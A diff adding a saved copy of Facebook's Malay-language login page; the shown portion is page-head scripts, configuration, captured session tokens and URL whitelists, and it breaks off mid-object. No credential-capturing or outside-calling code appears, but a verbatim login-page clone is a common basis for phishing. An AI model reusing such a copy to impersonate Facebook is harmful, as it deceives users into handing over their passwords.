@@ -1,0 +1,2576 @@
+<!DOCTYPE html>
+<html lang="ms" id="facebook" class="no_js">
+
+<head>
+    <meta charset="utf-8" />
+    <meta property="og:url" content="https://www.facebook.com/" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <script>
+        window._cstart = +new Date();
+    </script>
+    <script>
+        function envFlush(a) {
+            function b(b) {
+                for (var c in a) b[c] = a[c]
+            }
+            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
+        }
+        envFlush({
+            "ajaxpipe_token": "AXhVRw-tzIHjIch6",
+            "timeslice_heartbeat_config": {
+                "pollIntervalMs": 33,
+                "idleGapThresholdMs": 60,
+                "ignoredTimesliceNames": {
+                    "requestAnimationFrame": true,
+                    "Event listenHandler mousemove": true,
+                    "Event listenHandler mouseover": true,
+                    "Event listenHandler mouseout": true,
+                    "Event listenHandler scroll": true
+                },
+                "isHeartbeatEnabled": true,
+                "isArtilleryOn": false
+            },
+            "shouldLogCounters": true,
+            "timeslice_categories": {
+                "react_render": true,
+                "reflow": true
+            },
+            "sample_continuation_stacktraces": true,
+            "dom_mutation_flag": true,
+            "khsh": "0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe-0unjdojnx-0unjdojnx0-0gdubi^rdbsduOdv-0`sj`e`r-0q`xm`r-0StoRbs`qhof-0mhoj^q`xm`r",
+            "stack_trace_limit": 30,
+            "deferred_stack_trace_rate": 1000,
+            "timesliceBufferSize": 5000,
+            "show_invariant_decoder": false,
+            "compat_iframe_token": "AQ5SCF9G3F2QXJYs",
+            "isCQuick": false
+        });
+    </script>
+    <style></style>
+    <script>
+        __DEV__ = 0;
+        CavalryLogger = window.CavalryLogger || function(a) {
+            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
+                t_cstart: window._cstart
+            }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
+        }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
+            this.is_detailed_profiler = a;
+            return this
+        }, CavalryLogger.prototype.setTTIEvent = function(a) {
+            this.tti_event = a;
+            return this
+        }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
+            d = d ? this.piggy_values : this.values;
+            (typeof d[a] === "undefined" || c) && (d[a] = b);
+            return this
+        }, CavalryLogger.prototype.getLastTtiValue = function() {
+            return this.lastTtiValue
+        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
+            this.mark(a);
+            var e = this.values.t_cstart || this.values.t_start;
+            e = d ? e + d : CavalryLogger.now();
+            this.setValue(a, e, b, c);
+            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
+            return this
+        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
+            console.timeStamp(a)
+        } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
+            this.piggy_values[a] = b;
+            return this
+        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.disableArtilleryOnUntilOffLogging = !1, CavalryLogger.getInstance = function(a) {
+            typeof a === "undefined" && (a = CavalryLogger.id);
+            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+            return CavalryLogger.instances[a]
+        }, CavalryLogger.setPageID = function(a) {
+            if (CavalryLogger.id === 0) {
+                var b = CavalryLogger.getInstance();
+                CavalryLogger.instances[a] = b;
+                CavalryLogger.instances[a].lid = a;
+                delete CavalryLogger.instances[0]
+            }
+            CavalryLogger.id = a
+        }, CavalryLogger.now = function() {
+            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
+        }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources = function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js = function() {}, CavalryLogger.done_js = function() {};
+        CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+        CavalryLogger.prototype.measureResources = function(a, b) {
+            if (!this.log_resources) return;
+            var c = "bootload/" + a.name;
+            if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+            var d = CavalryLogger.now();
+            this.ongoing_watch[c] = d;
+            "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+            b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+            if (a.type === "js") {
+                c = "js_exec/" + a.name;
+                this.ongoing_watch[c] = d
+            }
+        }, CavalryLogger.prototype.stopWatch = function(a) {
+            if (this.ongoing_watch[a]) {
+                var b = CavalryLogger.now(),
+                    c = b - this.ongoing_watch[a];
+                this.bootloader_metrics[a] = c;
+                var d = this.piggy_values;
+                a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+                delete this.ongoing_watch[a]
+            }
+            return this
+        }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
+            var a = {};
+            Object.values(window.CavalryLogger.instances).forEach(function(b) {
+                b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
+            });
+            return a
+        }, CavalryLogger.start_js = function(a) {
+            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
+        }, CavalryLogger.done_js = function(a) {
+            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
+        }, CavalryLogger.prototype.profileEarlyResources = function(a) {
+            for (var b = 0; b < a.length; b++) this.measureResources({
+                name: a[b][0],
+                type: a[b][1] ? "js" : ""
+            }, "_EF_")
+        };
+        CavalryLogger.getInstance().log_resources = true;
+        CavalryLogger.getInstance().setIsDetailedProfiler(true);
+        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+    </script>
+    <noscript>
+        <meta http-equiv="refresh" content="0; URL=/login/device-based/regular/login?_fb_noscript=1" />
+    </noscript>
+    <title id="pageTitle">Log masuk ke Facebook | Facebook</title>
+    <meta property="og:site_name" content="Facebook" />
+    <meta property="og:url" content="https://www.facebook.com/login/device-based/regular/login" />
+    <meta property="og:locale" content="ms_MY" />
+    <link rel="search" type="application/opensearchdescription+xml" href="/osd.xml" title="Facebook" />
+    <link rel="canonical" href="https://www.facebook.com/login/" />
+    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/login/" />
+    <link rel="alternate" media="handheld" href="https://m.facebook.com/login/" />
+    <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/login/" />
+    <link rel="alternate" hreflang="en" href="https://www.facebook.com/login/" />
+    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/login/" />
+    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/login/" />
+    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/login/" />
+    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/login/" />
+    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/login/" />
+    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/login/" />
+    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/login/" />
+    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/login/" />
+    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/login/" />
+    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/login/" />
+    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/login/" />
+    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/login/" />
+    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/login/" />
+    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/login/" />
+    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/login/" />
+    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/login/" />
+    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/login/" />
+    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/login/" />
+    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/login/" />
+    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/login/" />
+    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/login/" />
+    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/login/" />
+    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/login/" />
+    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/login/" />
+    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/login/" />
+    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/login/" />
+    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/login/" />
+    <meta name="description" content="Log masuk ke Facebook untuk mula berkongsi dan berhubung dengan rakan anda, keluarga dan orang yang anda kenali." />
+    <meta name="robots" content="noodp,noydir" />
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/0,cross/qfRxixPPAKi.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Rh0gh" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yJ/l/0,cross/dNlW_p5DfSx.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="T1Fcr" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/1uxt1bMNsC3.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ccHw5" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/FrIpEyOY5QU.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="FQZQE" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/UE9pHcVaJ5v.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="nOHzA" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/l/0,cross/LWb5YwUq28M.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="VAuIp" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/l/0,cross/ayXl0jQ1Bsi.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ZNjDW" crossorigin="anonymous" />
+    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/59WZr8fdbqx.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="QPWJc" crossorigin="anonymous"></script>
+    <script>
+        requireLazy(["gkx"], function(gkx) {
+            gkx.add({
+                "676837": {
+                    "result": false,
+                    "hash": "AT7jC0qF5rvoPUh5"
+                },
+                "676940": {
+                    "result": false,
+                    "hash": "AT5N84i3C4c3_-Vz"
+                },
+                "946894": {
+                    "result": false,
+                    "hash": "AT5DmyVzR2SoCv33"
+                },
+                "996939": {
+                    "result": false,
+                    "hash": "AT50YkRdM-9jTm2a"
+                },
+                "996940": {
+                    "result": false,
+                    "hash": "AT5xvmi1_UZyjJOr"
+                },
+                "1263340": {
+                    "result": false,
+                    "hash": "AT6oExTRTL5pne7G"
+                },
+                "676920": {
+                    "result": false,
+                    "hash": "AT6MnD0caMQLbRmm"
+                },
+                "676921": {
+                    "result": false,
+                    "hash": "AT7M7fcXulEEesI2"
+                },
+                "676922": {
+                    "result": false,
+                    "hash": "AT5JolZpJpvc2CcH"
+                },
+                "1073500": {
+                    "result": true,
+                    "hash": "AT7bBO1llzFa63K3"
+                },
+                "1113247": {
+                    "result": false,
+                    "hash": "AT5K_ep_y04mtWhf"
+                },
+                "708253": {
+                    "result": false,
+                    "hash": "AT6nGzfll5VNdAQt"
+                },
+                "1167394": {
+                    "result": false,
+                    "hash": "AT4XBaWB7l_fiRIF"
+                }
+            });
+        });
+        requireLazy(["qex"], function(qex) {
+            qex.add({
+                "1211266": {
+                    "r": null
+                }
+            });
+        });
+        require("TimeSliceImpl").guard(function() {
+            (require("ServerJSDefine")).handleDefines([
+                ["cr:696703", [], {
+                    "__rc": [null, "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:708886", ["EventProfilerImpl"], {
+                    "__rc": ["EventProfilerImpl", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:717822", ["TimeSliceImpl"], {
+                    "__rc": ["TimeSliceImpl", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:806696", ["clearTimeoutBlue"], {
+                    "__rc": ["clearTimeoutBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:807042", ["setTimeoutBlue"], {
+                    "__rc": ["setTimeoutBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
+                    "__rc": ["setIntervalAcrossTransitionsBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
+                    "__rc": ["setTimeoutAcrossTransitionsBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:1003267", ["clearIntervalBlue"], {
+                    "__rc": ["clearIntervalBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:1100101", ["requestAnimationFrameAcrossTransitionsSimple"], {
+                    "__rc": ["requestAnimationFrameAcrossTransitionsSimple", "Aa24g6WydOkBB0mBUMxbSc1WnguGqtw0MllmmmMItuiOEvj2pjWw-eyiNnXLahBA9s1uN8U"]
+                }, -1],
+                ["cr:896461", ["setIntervalBlue"], {
+                    "__rc": ["setIntervalBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:925100", ["RunBlue"], {
+                    "__rc": ["RunBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:1000292", ["BanzaiNew"], {
+                    "__rc": ["BanzaiNew", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:729414", [], {
+                    "__rc": [null, "Aa1uIiDvXW-xWYL-F8cH6pqTriU3NJ4UUGuvd73h9KNirgAkwgKZbC60Yfc7unrjzDFoeJ2XoZ4VsdAKQCLS"]
+                }, -1],
+                ["cr:692209", ["cancelIdleCallbackBlue"], {
+                    "__rc": ["cancelIdleCallbackBlue", "Aa16twE6ppfFhJTF8Q8r8afteGbwVEcwkkjIEwsBPBCyZX0ckdoZBITMdmPAulvni08eLi8fEnly_rNQyLFe9p8"]
+                }, -1],
+                ["cr:695720", ["SnappyCompressUtil"], {
+                    "__rc": ["SnappyCompressUtil", "Aa01ylFWhLcV608vaIlWrbSFONkImybBqbkPUWz9LblyKRK4O02OxQ8n167NZwOL8HiWacSJSMze26gHUwAyAPkQpFg"]
+                }, -1],
+                ["URLFragmentPreludeConfig", [], {
+                    "hashtagRedirect": true,
+                    "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"]
+                }, 137],
+                ["BootloaderConfig", [], {
+                    "jsRetries": null,
+                    "jsRetryAbortNum": 2,
+                    "jsRetryAbortTime": 5,
+                    "payloadEndpointURI": "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/",
+                    "preloadBE": false,
+                    "assumeNotNonblocking": false,
+                    "trackUnpredictedBEResources": true,
+                    "shouldCoalesceModuleRequestsMadeInSameTick": true,
+                    "staggerJsDownloads": false,
+                    "preloader_num_preloads": 0,
+                    "preloader_preload_after_dd": false,
+                    "preloader_num_loads": 1,
+                    "preloader_enabled": false,
+                    "retryQueuedBootloads": false,
+                    "silentDups": false,
+                    "asyncPreloadBoost": true
+                }, 329],
+                ["CSSLoaderConfig", [], {
+                    "timeout": 5000,
+                    "modulePrefix": "BLCSS:",
+                    "loadEventSupported": true
+                }, 619],
+                ["CookieCoreConfig", [], {
+                    "a11y": {
+                        "s": "None"
+                    },
+                    "act": {
+                        "s": "Lax"
+                    },
+                    "c_user": {
+                        "s": "None"
+                    },
+                    "dpr": {
+                        "t": 604800,
+                        "s": "None"
+                    },
+                    "js_ver": {
+                        "t": 604800,
+                        "s": "None"
+                    },
+                    "locale": {
+                        "t": 604800,
+                        "s": "None"
+                    },
+                    "m_pixel_ratio": {
+                        "t": 604800,
+                        "s": "None"
+                    },
+                    "noscript": {
+                        "s": "None"
+                    },
+                    "pnl_data2": {
+                        "t": 2,
+                        "s": "None"
+                    },
+                    "presence": {
+                        "s": "None"
+                    },
+                    "sfau": {
+                        "s": "None"
+                    },
+                    "wd": {
+                        "t": 604800,
+                        "s": "None"
+                    },
+                    "x-referer": {
+                        "s": "None"
+                    },
+                    "x-src": {
+                        "t": 1,
+                        "s": "None"
+                    }
+                }, 2104],
+                ["CurrentCommunityInitialData", [], {}, 490],
+                ["CurrentEnvironment", [], {
+                    "facebookdotcom": true,
+                    "messengerdotcom": false
+                }, 827],
+                ["CurrentUserInitialData", [], {
+                    "USER_ID": "0",
+                    "ACCOUNT_ID": "0",
+                    "NAME": "",
+                    "SHORT_NAME": null,
+                    "IS_MESSENGER_ONLY_USER": false,
+                    "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
+                    "APP_ID": "256281040558"
+                }, 270],
+                ["DTSGInitialData", [], {}, 258],
+                ["ISB", [], {}, 330],
+                ["LSD", [], {
+                    "token": "AVqJqDqg"
+                }, 323],
+                ["ServerNonce", [], {
+                    "ServerNonce": "PJEQNO_2Kzbm-JjPV6xEdb"
+                }, 141],
+                ["SiteData", [], {
+                    "server_revision": 1001641474,
+                    "client_revision": 1001641474,
+                    "tier": "",
+                    "push_phase": "C3",
+                    "pkg_cohort": "PHASED:DEFAULT",
+                    "pr": 1,
+                    "haste_site": "www",
+                    "be_one_ahead": false,
+                    "ir_on": true,
+                    "is_rtl": false,
+                    "is_comet": false,
+                    "hsi": "6786054741145932560-0",
+                    "spin": 4,
+                    "__spin_r": 1001641474,
+                    "__spin_b": "trunk",
+                    "__spin_t": 1580001493,
+                    "vip": "2a03:2880:f12a:83:face:b00c:0:25de"
+                }, 317],
+                ["SprinkleConfig", [], {
+                    "param_name": "jazoest",
+                    "version": 2,
+                    "should_randomize": false
+                }, 2111],
+                ["UserAgentData", [], {
+                    "browserArchitecture": "64",
+                    "browserFullVersion": "79.0.3945.130",
+                    "browserMinorVersion": 0,
+                    "browserName": "Chrome",
+                    "browserVersion": 79,
+                    "deviceName": "Unknown",
+                    "engineName": "WebKit",
+                    "engineVersion": "537.36",
+                    "platformArchitecture": "64",
+                    "platformName": "Windows",
+                    "platformVersion": "10",
+                    "platformFullVersion": "10"
+                }, 527],
+                ["ZeroCategoryHeader", [], {}, 1127],
+                ["ZeroRewriteRules", [], {
+                    "rewrite_rules": {},
+                    "whitelist": {
+                        "\/hr\/r": 1,
+                        "\/hr\/p": 1,
+                        "\/zero\/unsupported_browser\/": 1,
+                        "\/zero\/policy\/optin": 1,
+                        "\/zero\/optin\/write\/": 1,
+                        "\/zero\/optin\/legal\/": 1,
+                        "\/zero\/optin\/free\/": 1,
+                        "\/about\/privacy\/": 1,
+                        "\/about\/privacy\/update\/": 1,
+                        "\/about\/privacy\/update": 1,
+                        "\/zero\/toggle\/welcome\/": 1,
+                        "\/zero\/toggle\/nux\/": 1,
+                        "\/fup\/interstitial\/": 1,
+                        "\/work\/landing": 1,
+                        "\/work\/login\/": 1,
+                        "\/work\/email\/": 1,
+                        "\/ai.php": 1,
+                        "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
+                        "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
+                        "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
+                        "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
+                        "\/qp\/interstitial\/": 1,
+                        "\/qp\/action\/redirect\/": 1,
+                        "\/qp\/action\/close\/": 1,
+                        "\/zero\/support\/ineligible\/": 1,
+                        "\/zero_balance_redirect\/": 1,
+                        "\/zero_balance_redirect": 1,
+                        "\/zero_balance_redirect\/l\/": 1,
+                        "\/l.php": 1,
+                        "\/lsr.php": 1,
+                        "\/ajax\/dtsg\/": 1,
+                        "\/checkpoint\/block\/": 1,
+                        "\/exitdsite": 1,
+                        "\/zero\/balance\/pixel\/": 1,
+                        "\/zero\/balance\/": 1,
+                        "\/zero\/balance\/carrier_landing\/": 1,
+                        "\/zero\/flex\/logging\/": 1,
+                        "\/tr": 1,
+                        "\/tr\/": 1,
+                        "\/sem_campaigns\/sem_pixel_test\/": 1,
+                        "\/bookmarks\/flyout\/body\/": 1,
+                        "\/zero\/subno\/": 1,
+                        "\/confirmemail.php": 1,
+                        "\/policies\/": 1,
+                        "\/mobile\/internetdotorg\/classifier\/": 1,
+                        "\/zero\/dogfooding": 1,
+                        "\/xti.php": 1,
+                        "\/zero\/fblite\/config\/": 1,
+                        "\/hr\/zsh\/wc\/": 1,
+                        "\/4oh4.php": 1,
+                        "\/autologin.php": 1,
+                        "\/birthday_help.php": 1,
+                        "\/checkpoint\/": 1,
+                        "\/contact-importer\/": 1,
+                        "\/cr.php": 1,
+                        "\/legal\/terms\/": 1,
+                        "\/login.php": 1,
+                        "\/login\/": 1,
+                        "\/mobile\/account\/": 1,
+                        "\/n\/": 1,
+                        "\/remote_test_device\/": 1,
+                        "\/upsell\/buy\/": 1,
+                        "\/upsell\/buyconfirm\/": 1,
+                        "\/upsell\/buyresult\/": 1,
+                        "\/upsell\/promos\/": 1,
+                        "\/upsell\/continue\/": 1,
+                        "\/upsell\/h\/promos\/": 1,
+                        "\/upsell\/loan\/learnmore\/": 1,
+                        "\/upsell\/purchase\/": 1,
+                        "\/upsell\/promos\/upgrade\/": 1,
+                        "\/upsell\/buy_redirect\/": 1,
+                        "\/upsell\/loan\/buyconfirm\/": 1,
+                        "\/upsell\/loan\/buy\/": 1,
+                        "\/upsell\/sms\/": 1,
+                        "\/wap\/a\/channel\/reconnect.php": 1,
+                        "\/wap\/a\/nux\/wizard\/nav.php": 1,
+                        "\/wap\/appreg.php": 1,
+                        "\/wap\/birthday_help.php": 1,
+                        "\/wap\/c.php": 1,
+                        "\/wap\/confirmemail.php": 1,
+                        "\/wap\/cr.php": 1,
+                        "\/wap\/login.php": 1,
+                        "\/wap\/r.php": 1,
+                        "\/zero\/datapolicy": 1,
+                        "\/a\/timezone.php": 1,
+                        "\/a\/bz": 1,
+                        "\/bz\/reliability": 1,
+                        "\/r.php": 1,
+                        "\/mr\/": 1,
+                        "\/reg\/": 1,
+                        "\/registration\/log\/": 1,
+                        "\/terms\/": 1,
+                        "\/f123\/": 1,
+                        "\/expert\/": 1,
+                        "\/experts\/": 1,
+                        "\/terms\/index.php": 1,
+                        "\/terms.php": 1,
+                        "\/srr\/": 1,
+                        "\/msite\/redirect\/": 1,
+                        "\/fbs\/pixel\/": 1,
+                        "\/contactpoint\/preconfirmation\/": 1,
+                        "\/contactpoint\/cliff\/": 1,
+                        "\/contactpoint\/confirm\/submit\/": 1,
+                        "\/contactpoint\/confirmed\/": 1,
+                        "\/contactpoint\/login\/": 1,
+                        "\/preconfirmation\/contactpoint_change\/": 1,
+                        "\/help\/contact\/": 1,
+                        "\/survey\/": 1,
+                        "\/upsell\/loyaltytopup\/accept\/": 1,
+                        "\/settings\/": 1,
+                        "\/lite\/": 1
+                    }
+                }, 1478],
+                ["PromiseUsePolyfillSetImmediateGK", [], {
+                    "www_always_use_polyfill_setimmediate": false
+                }, 2190],
+                ["CookieCoreLoggingConfig", [], {
+                    "maximumIgnorableStallMs": 16.67,
+                    "sampleRate": 9.7e-5,
+                    "sampleRateClassic": 1.0e-10,
+                    "sampleRateFastStale": 1.0e-8
+                }, 3401],
+                ["ImmediateImplementationExperiments", [], {
+                    "prefer_message_channel": true
+                }, 3419],
+                ["DTSGInitData", [], {
+                    "token": "",
+                    "async_get_token": ""
+                }, 3515],
+                ["UriNeedRawQuerySVConfig", [], {
+                    "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com"]
+                }, 3871],
+                ["InitialCookieConsent", [], {
+                    "deferCookies": false,
+                    "noCookies": false,
+                    "shouldShowCookieBanner": false
+                }, 4328],
+                ["TrustedTypesConfig", [], {
+                    "useTrustedTypes": false,
+                    "reportOnly": true
+                }, 4548],
+                ["BigPipeExperiments", [], {
+                    "link_images_to_pagelets": false,
+                    "enable_bigpipe_plugins": false
+                }, 907],
+                ["EventConfig", [], {
+                    "sampling": {
+                        "bandwidth": 0,
+                        "play": 0,
+                        "playing": 0,
+                        "progress": 0,
+                        "pause": 0,
+                        "ended": 0,
+                        "seeked": 0,
+                        "seeking": 0,
+                        "waiting": 0,
+                        "loadedmetadata": 0,
+                        "canplay": 0,
+                        "selectionchange": 0,
+                        "change": 0,
+                        "timeupdate": 2000000,
+                        "adaptation": 0,
+                        "focus": 0,
+                        "blur": 0,
+                        "load": 0,
+                        "error": 0,
+                        "message": 0,
+                        "abort": 0,
+                        "storage": 0,
+                        "scroll": 200000,
+                        "mousemove": 20000,
+                        "mouseover": 10000,
+                        "mouseout": 10000,
+                        "mousewheel": 1,
+                        "MSPointerMove": 10000,
+                        "keydown": 0.1,
+                        "click": 0.02,
+                        "mouseup": 0.02,
+                        "__100ms": 0.001,
+                        "__default": 5000,
+                        "__min": 100,
+                        "__interactionDefault": 200,
+                        "__eventDefault": 100000
+                    },
+                    "page_sampling_boost": 1,
+                    "interaction_regexes": {
+                        "BlueBarAccountChevronMenu": " _5lxs(?: .*)?$",
+                        "BlueBarHomeButton": " _bluebarLinkHome__interaction-root(?: .*)?$",
+                        "BlueBarProfileLink": " _1k67(?: .*)?$",
+                        "ReactComposerSproutMedia": " _1pnt(?: .*)?$",
+                        "ReactComposerSproutAlbum": " _1pnu(?: .*)?$",
+                        "ReactComposerSproutNote": " _3-9x(?: .*)?$",
+                        "ReactComposerSproutLocation": " _1pnv(?: .*)?$",
+                        "ReactComposerSproutActivity": " _1pnz(?: .*)?$",
+                        "ReactComposerSproutPeople": " _1pn-(?: .*)?$",
+                        "ReactComposerSproutLiveVideo": " _5tv7(?: .*)?$",
+                        "ReactComposerSproutMarkdown": " _311p(?: .*)?$",
+                        "ReactComposerSproutFormattedText": " _mwg(?: .*)?$",
+                        "ReactComposerSproutSticker": " _2vri(?: .*)?$",
+                        "ReactComposerSproutSponsor": " _5t5q(?: .*)?$",
+                        "ReactComposerSproutEllipsis": " _1gr3(?: .*)?$",
+                        "ReactComposerSproutContactYourRepresentative": " _3cnv(?: .*)?$",
+                        "ReactComposerSproutFunFact": " _2_xs(?: .*)?$",
+                        "TextExposeSeeMoreLink": " see_more_link(?: .*)?$",
+                        "SnowliftBigCloseButton": "(?: _xlt(?: .*)? _418x(?: .*)?$| _418x(?: .*)? _xlt(?: .*)?$)",
+                        "SnowliftPrevPager": "(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)",
+                        "SnowliftNextPager": "(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)",
+                        "SnowliftFullScreenButton": "#fbPhotoSnowliftFullScreenSwitch( .+)*",
+                        "PrivacySelectorMenu": "(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)",
